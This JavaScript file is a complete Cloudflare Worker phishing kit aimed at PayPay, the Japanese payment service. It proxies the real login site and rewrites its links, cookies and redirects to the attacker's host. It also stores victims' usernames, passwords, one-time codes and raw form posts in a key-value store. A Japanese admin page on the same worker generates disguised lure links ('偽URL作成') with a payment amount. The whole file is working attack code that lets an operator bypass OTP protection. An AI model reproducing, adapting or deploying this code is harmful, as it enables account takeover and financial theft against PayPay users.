// Cloudflare Worker — reverse proxy to PayPay + credential store + admin
// KV binding: CREDS
// /admin で管理画面を配信（Flask不要）
// 16文字IDパスは PayPay ログインにプロキシ

const TARGET_ORIGIN = "https://www.paypay.ne.jp";
const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;

const ADMIN_HTML = `<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>管理画面 — PayPay</title>
  <style>
    body { font-family: -apple-system, sans-serif; background:#0f1117; color:#e2e8f0; margin:0; padding:20px; }
    .card { background:#1a1d27; border:1px solid #2d3148; border-radius:10px; padding:20px; margin-bottom:20px; max-width:600px; }
    input { background:#0f1117; border:1px solid #2d3148; color:#e2e8f0; padding:8px 12px; border-radius:6px; width:200px; }
    button { background:#3895ff; color:#fff; border:none; padding:9px 20px; border-radius:6px; cursor:pointer; font-weight:600; }
    .link { font-family:monospace; color:#90cdf4; word-break:break-all; margin-top:10px; }
    .msg { margin-top:8px; color:#48bb78; }
  </style>
</head>
<body>
  <div class="card">
    <h2>偽URL作成</h2>
    <div>
      <label>金額（円）</label><br>
      <input id="amount" type="number" min="1" placeholder="例: 5000">
      <button id="create">リンクを作成</button>
    </div>
    <div class="msg" id="msg"></div>
    <div class="link" id="result"></div>
  </div>
  <script>
    function genId() {
      var c = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      var s = ''; for (var i=0;i<16;i++) s += c[Math.floor(Math.random()*c.length)];
      return s;
    }
    document.getElementById('create').onclick = function() {
      var amount = document.getElementById('amount').value;
      if (!amount || amount <= 0) { document.getElementById('msg').textContent = '金額を入力してください'; return; }
      var id = genId();
      var url = location.origin + '/' + id;
      document.getElementById('result').innerHTML = '<a href="' + url + '" target="_blank">' + url + '</a>';
      document.getElementById('msg').textContent = '作成しました';
      navigator.clipboard && navigator.clipboard.writeText(url);
    };
  </script>
</body>
</html>`;

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const workerHost = url.host;

    if (url.pathname === "/admin" || url.pathname === "/admin.html") {
      return new Response(ADMIN_HTML, {
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }

    const secret = (env.SECRET || "").trim();
    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
      return handleStore(request, env);
    }

    const pathParts = url.pathname.split("/").filter(Boolean);
    if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
      const loginUrl = new URL(request.url);
      loginUrl.pathname = "/app/account/sign-in";
      return proxy(new Request(loginUrl, request), env, workerHost);
    }

    return proxy(request, env, workerHost);
  },
};

async function proxy(request, env, workerHost) {
  const url = new URL(request.url);
  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;

  const headers = new Headers(request.headers);
  headers.set("Host", "www.paypay.ne.jp");
  headers.delete("cf-connecting-ip");
  headers.delete("cf-ray");
  headers.delete("cf-visitor");

  let body = request.body;

  if ((request.method === "POST" || request.method === "PUT") && url.pathname.includes("/oauth/token")) {
    const clone = request.clone();
    try {
      const text = await clone.text();
      body = text;

      let parsed = {};
      try { parsed = JSON.parse(text); } catch {
        const params = new URLSearchParams(text);
        for (const [k, v] of params) parsed[k] = v;
      }

      const captured = {
        type: "oauth_token",
        path: url.pathname,
        grant_type: parsed.grant_type || null,
        username: parsed.username || parsed.phone || null,
        password: parsed.password || null,
        otp: parsed.otp || null,
        otp_prefix: parsed.otp_prefix || null,
        scope: parsed.scope || null,
        client_uuid: parsed.client_uuid || null,
        raw: text.slice(0, 1500),
        ts: new Date().toISOString(),
        ua: request.headers.get("User-Agent") || "",
      };

      const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
      await env.CREDS.put(key, JSON.stringify(captured));
    } catch {}
  } else if (request.method === "POST" || request.method === "PUT") {
    const clone = request.clone();
    try {
      const text = await clone.text();
      if (text && (text.includes("password") || text.includes("username") || text.includes("otp"))) {
        const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
        await env.CREDS.put(key, JSON.stringify({
          type: "captured_post",
          path: url.pathname,
          body: text.slice(0, 1500),
          ts: new Date().toISOString(),
        }));
      }
      body = text;
    } catch {}
  }

  const res = await fetch(targetUrl, {
    method: request.method,
    headers,
    body: (request.method !== "GET" && request.method !== "HEAD") ? body : undefined,
    redirect: "manual",
  });

  const newHeaders = new Headers(res.headers);

  const setCookies = newHeaders.getAll("set-cookie") || [];
  newHeaders.delete("set-cookie");
  for (const c of setCookies) {
    const rewritten = c
      .replace(/Domain=[^;]+/gi, `Domain=${workerHost}`)
      .replace(/domain=[^;]+/gi, `domain=${workerHost}`);
    newHeaders.append("set-cookie", rewritten);
  }

  const loc = newHeaders.get("location");
  if (loc && loc.includes("paypay.ne.jp")) {
    newHeaders.set("location", loc.replace(/https?:\/\/[^/]*paypay\.ne\.jp/g, `https://${workerHost}`));
  }

  const contentType = newHeaders.get("content-type") || "";
  if (contentType.includes("text/html")) {
    let html = await res.text();
    html = html.replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) =>
      m.replace(/https?:\/\/[^/]*paypay\.ne\.jp/, `https://${workerHost}`)
    );
    return new Response(html, { status: res.status, headers: newHeaders });
  }

  return new Response(res.body, { status: res.status, headers: newHeaders });
}

async function handleStore(request, env) {
  let body;
  try { body = await request.json(); } catch { body = {}; }
  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
  await env.CREDS.put(key, JSON.stringify(body));
  return json({ ok: true, key });
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data, null, 2), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}
